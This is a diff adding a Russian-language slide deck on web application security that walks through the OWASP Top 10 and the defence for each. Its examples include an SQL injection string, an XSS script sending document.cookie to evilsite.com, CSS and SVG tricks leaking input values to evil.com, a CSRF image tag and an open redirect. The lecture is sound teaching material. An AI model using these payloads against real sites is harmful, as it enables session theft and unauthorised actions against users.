@@ -1,0 +1,467 @@
+<!doctype html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <title>Принципы и приемы написания эффективного кода</title>
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+    <link rel="stylesheet" href="../css/reveal.css">
+    <link rel="stylesheet" href="../css/theme/yandex.css" id="theme">
+    <link rel="stylesheet" href="../lib/css/zenburn.css">
+    <link rel="stylesheet" href="../17-security/css/user.css">
+</head>
+<body class="yandex nodejs">
+<div class="reveal">
+    <div class="slides">
+
+        <section class="large">
+            <h3>Безопасность<br> веб-приложений</h3>
+            <p class="author">
+                <small>Олег Мохов</small>
+            </p>
+        </section>
+
+        <section>
+            <section>
+                <h2>Ликбез</h2>
+            </section>
+            <section>
+                <h2>Угроза</h2>
+                <blockquote class="fragment">потенциально возможное событие, которое посредством работы с компонентами сервиса, может нанести ущерб</blockquote>
+            </section>
+            <section>
+                <h2>Уязвимость</h2>
+                <blockquote class="fragment">свойство сервиса, использование которого злоумышленником приводит к реализации угрозы</blockquote>
+            </section>
+            <section>
+                <h2>Атака</h2>
+                <blockquote class="fragment">реализация угрозы, путём использования уязвимостей</blockquote>
+            </section>
+            <section>
+                <h2>OWASP</h2>
+                <p>The Open Web Application<br> Security Project</p>
+            </section>
+            <section>
+                <h2>OWASP Top 10</h2>
+            </section>
+        </section>
+        <section>
+            <section>
+                <h2>Injection</h2>
+            </section>
+            <section>
+                <h3>SQL injection</h3>
+                <pre><code class="sql">
+SELECT * FROM accounts WHERE user='1'
+                </code></pre>
+                <pre class="fragment"><code>
+http://mysite.com/user?id=1
+                </code></pre>
+                <pre class="fragment"><code class="javascript">
+let sql = "SELECT * FROM accounts WHERE user='%user%'";
+sql.replace('%user%', req.query.id);
+                </code></pre>
+            </section>
+            <section>
+                <h3>SQL injection</h3>
+                <pre><code>
+http://mysite.com/user?id=-1' or '1'='1
+                </code></pre>
+                <pre class="fragment"><code class="sql">
+SELECT * FROM accounts WHERE user='-1' or '1'='1'
+                </code></pre>
+            </section>
+            <section>
+                <h3>SQL injection. Защита</h3>
+                <ul>
+                    <li>Эскейпинг небезопасных символов перед использованием в запросе</li>
+                    <li>Использование параметризованных запросов</li>
+                </ul>
+            </section>
+        </section>
+        <section>
+            <section>
+                <h2>XSS</h2>
+                <h4 class="fragment">Cross Site-Scripting</h4>
+            </section>
+            <section>
+                <h3>XSS</h3>
+                <blockquote>атака при которой вредоносный код внедряется в код вашего сайта и может быть запущен</blockquote>
+            </section>
+            <section>
+                <h3>XSS</h3>
+                <pre><code class="html">
+<input type="text" name="username"/>
+                </code></pre>
+                <pre class="fragment"><code class="javascript">
+res.render('Привет, ' + req.query.username);
+                </code></pre>
+                <pre class="fragment"><code class="javascript">
+&lt;script&gt;
+window.location='http://evilsite.com?a='+document.cookie;
+&lt;/script&gt;
+                </code></pre>
+            </section>
+            <section>
+                <h3>XSS</h3>
+                <pre><code>
+http://mysite.com?username=Vanya
+                </code></pre>
+                <pre class="fragment"><code class="javascript">
+http://mysite.com?username=Vanya<script>...</script>
+                </code></pre>
+            </section>
+            <section>
+                <h2>
+                    <a href="https://youtu.be/-81pbmyKOu8?t=14m41s">Пример от Пети</a>
+                </h2>
+            </section>
+            <section>
+                <h3>Типы XSS</h3>
+                <ul>
+                    <li>Хранимые</li>
+                    <li>Отраженные</li>
+                </ul>
+            </section>
+            <section>
+                <h3>Что можно увести?</h3>
+                <ul>
+                    <li>document.cookie</li>
+                    <li>window.localStorage</li>
+                    <li>keylogger</li>
+                    <li>redirect</li>
+                </ul>
+            </section>
+            <section>
+                <h2>Способы запуска скриптов</h2>
+            </section>
+            <section>
+                <pre><code class="html">
+&lt;div style='{{css}}'&gt;
+    &lt;input value='{{value}}'&gt;
+    Hello, {{title}}
+    {{image}}
+&lt;/div&gt;
+                </code></pre>
+            </section>
+            <section>
+                <h3>Через атрибут тега</h3>
+                <pre><code class="html">
+&lt;input value='{{value}}'&gt;
+                </code></pre>
+                <pre class="fragment"><code class="javascript">
+value = "' onmouseover='alert(1)'"
+                </code></pre>
+            </section>
+            <section>
+                <h3>Через CSS</h3>
+                <pre><code class="html">
+&lt;div style='{{css}}'&gt;
+                </code></pre>
+                <pre class="fragment"><code class="css">
+input[value^="a"] {
+    background-color: url(//evil.com/?v=a);
+}
+input[value^="b"] {
+    background-color: url(//evil.com/?v=b);
+}
+                </code></pre>
+            </section>
+            <section>
+                <h3>Через картинку</h3>
+                <pre><code class="html">
+{{image}}
+                </code></pre>
+                <pre class="fragment size-XXXS"><code class="html">
+<defs>
+    <path id='example' d="...">
+</defs>
+<use xlink:href="#example" visibility="hidden">
+    <set begin="accessKey(a)"
+         attributeName="xlink:href" to="//evil.com/?a">
+</use>
+                </code></pre>
+            </section>
+            <section>
+                <h3>XSS. Защита</h3>
+                <ul>
+                    <li>Валидация входных данных</li>
+                    <li>escape'инг данных при генерации страниц</li>
+                    <li class="fragment">Использование санитайзеров (<a href="https://www.npmjs.com/package/sanitize-html">sanitize-html</a>)</li>
+                    <li class="fragment">Использование CSP</li>
+                </ul>
+            </section>
+
+            <section>
+                <h2>CSP</h2>
+                <h4>Content Security Policy</h4>
+            </section>
+            <section>
+                <pre><code>
+Content-Security-Policy: default-src 'self'
+                </code></pre>
+            </section>
+            <section>
+                <pre><code>
+Content-Security-Policy: default-src 'self' *.trusted.com
+                </code></pre>
+            </section>
+            <section>
+                <pre><code>
+Content-Security-Policy:
+    default-src 'self';
+    img-src *;
+    media-src media1.com media2.com;
+    script-src userscripts.example.com
+                </code></pre>
+            </section>
+            <section>
+                <pre><code>
+Content-Security-Policy:
+    default-src https://onlinebanking.jumbobank.com
+                </code></pre>
+            </section>
+            <section>
+                <h3>XSS. Защита</h3>
+                <ul>
+                    <li>Валидация входных данных</li>
+                    <li>escape'инг данных при генерации страниц</li>
+                    <li>Использование санитайзеров (<a href="https://www.npmjs.com/package/sanitize-html">sanitize-html</a>)</li>
+                    <li>Использование CSP</li>
+                    <li class="fragment">Флаг HTTPOnly, SecureOnly для кук</li>
+                    <li class="fragment">Заголовок X-XSS-Protection</li>
+                    <li class="fragment">Заголовок X-Frame-Options</li>
+                </ul>
+            </section>
+            <section>
+                <h3>ClickJacking</h3>
+            </section>
+            <section>
+                <pre><code>
+X-Frame-Options: SAMEORIGIN
+X-Frame-Options: DENY
+                </code></pre>
+            </section>
+            <section>
+                <pre><code>
+if ($http_referer !~ "^https?://([^/]+\.)?webvisor\.com/"){
+    add_header X-Frame-Options SAMEORIGIN always;
+}
+                </code></pre>
+            </section>
+            <section>
+                <h3>
+                    <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules">OWASP XSS Prevention Cheat Sheet</a>
+                </h3>
+            </section>
+        </section>
+
+        <section>
+            <section>
+                <h3>Слабый механизм аутентификации и менеджмента сессий</h3>
+                <h4>Weak authentication and session management</h4>
+            </section>
+            <section>
+                <p>Сессии на основе cookie</p>
+                <pre class="fragment"><code>
+GET /index HTTP/1.1
+Host: example.com
+Cookie: session_id=123456;
+                </code></pre>
+            </section>
+            <section>
+                <h3>Типичные «запахи»</h3>
+                <ul>
+                    <li class="fragment">Фиксация сессий на длительное время</li>
+                    <li class="fragment">Перехват паролей</li>
+                    <li class="fragment">«Угадывание» сессий</li>
+                    <li class="fragment">Передача сессий в GET-параметре</li>
+                    <li class="fragment">Перебор через форму логина</li>
+                    <li class="fragment">Увод cookie через XSS</li>
+                </ul>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li class="fragment">Использование готовых и протестированных библиотек</li>
+                    <li class="fragment">Не хранить и не передавать пользовательские данные в открытом виде</li>
+                </ul>
+            </section>
+            <section>
+                <h2>Это сложная задача!</h2>
+                <h3 class="fragment">
+                    <a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">Гайд OWASP v4</a>
+                </h3>
+            </section>
+        </section>
+
+        <section>
+            <section>
+                <h2>Небезопасные прямые ссылки на объекты</h2>
+                <h4>Insecure Direct Object References</h4>
+            </section>
+            <section>
+                <p>Сессии на основе cookie</p>
+                <pre class="fragment"><code>
+http://example.com/user?accountId=12345678
+                </code></pre>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li>Проверять авторизацию</li>
+                    <li>Минимизировать использование прямых указателей на объекты системы</li>
+                </ul>
+            </section>
+        </section>
+
+        <section>
+            <section>
+                <h2>CSRF</h2>
+                <h3>Cross Site Request Forgery</h3>
+            </section>
+            <section>
+                <h3>CSRF</h3>
+                <pre><code>
+http://mybank.ru/transfer?amount=100000&to=123456
+                </code></pre>
+                <pre class="fragment"><code class="html">
+&lt;img
+src="http://mybank.ru/transfer?amount=100000&to=123456"&gt;
+                </code></pre>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li class="fragment">Подписывание запросов токеном</li>
+                    <li class="fragment">Дополнительно рекомендуется все действия делать POST-запросами</li>
+                    <li class="fragment">Проверка источника запроса</li>
+                </ul>
+            </section>
+        </section>
+
+        <section>
+            <section>
+                <h2>Insecure Cryptographic Storage</h2>
+            </section>
+            <section>
+                <blockquote>А давайте напишем свой алгоритм шифрования!</blockquote>
+            </section>
+            <section>
+                <h3>Insecure Cryptographic Storage</h3>
+                <ul>
+                    <li>Разработчики написали свой алгоритм шифрования</li>
+                    <li>Приложение хранит критичную информацию в открытом виде в базе</li>
+                    <li>Пароли хэшируются, но не солятся</li>
+                </ul>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li>Используйте готовые и проверенные алгоритмы шифрования</li>
+                    <li>Используйте стойки алгоритмы</li>
+                    <li>Разработайте систему безопасного хранения ключей шифрования</li>
+                    <li>«Солите» хэши</li>
+                </ul>
+            </section>
+        </section>
+
+        <section>
+            <section>
+                <h2>Missing Function Level Access Control</h2>
+            </section>
+            <section>
+                <pre><code>
+http://mysite.com/nimda
+                </code></pre>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li>Доступ запрещён по умолчанию</li>
+                    <li class="fragment">Аутентификация и авторизация</li>
+                    <li class="fragment">Политики и роли</li>
+                </ul>
+            </section>
+        </section>
+
+        <section>
+            <section>
+                <h2>Insufficient Transport Layer Protection</h2>
+            </section>
+            <section>
+                <h3>Insufficient Transport Layer Protection</h3>
+                <ul>
+                    <li>Критичная информация передаётся по протоколу HTTP</li>
+                    <li class="fragment">Публичный Wi-Fi <span class="fragment">(Dlink Wi-Fi)</span></li>
+                    <li class="fragment">Самоподписанные сертификаты</li>
+                </ul>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li>HTTPS only</li>
+                    <li class="fragment">Аттрибут Secure для сессионной куки, STS</li>
+                    <li class="fragment">Регулярные сканирования</li>
+                </ul>
+            </section>
+        </section>
+        <section>
+            <section>
+                <h2>Unvalidated Redirects and Forwards</h2>
+            </section>
+            <section>
+                <h3>Unvalidated Redirects and Forwards</h3>
+                <pre class="fragment"><code>
+http://mysite.com/redirect?url=http://evil.com
+                </code></pre>
+            </section>
+            <section>
+                <h3>Способы защиты</h3>
+                <ul>
+                    <li>Не использовать редиректы</li>
+                    <li class="fragment">Предупреждать пользователя об уходе на другую страницу</li>
+                </ul>
+            </section>
+        </section>
+
+        <section>
+            <h3>Ссылки</h3>
+            <ul>
+                <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">Гайд OWASP v4</a></li>
+                <li><a href="https://html5sec.org/">HTML5 Security Cheatsheet</a></li>
+                <li><a href="https://github.com/helmetjs/helmet">Helmet.js</a></li>
+                <li><a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">Vulnerability Scanners</a></li>
+            </ul>
+        </section>
+
+
+
+
+        <script src="../lib/js/head.min.js"></script>
+        <script src="../js/reveal.js"></script>
+        <script>
+            Reveal.initialize({
+                controls: false,
+                progress: true,
+                slideNumber: true,
+                history: true,
+                center: true,
+                hideAddressBar: true,
+                transition: 'slide',
+                dependencies: [
+                    {
+                        src: '../plugin/highlight/highlight.js',
+                        async: true,
+                        condition: function() {
+                            return Boolean(document.querySelector('pre code'));
+                        },
+                        callback: function() {
+                            hljs.initHighlightingOnLoad();
+                        }
+                    }
+                ]
+            });
+        </script>
+</body>
+</html>
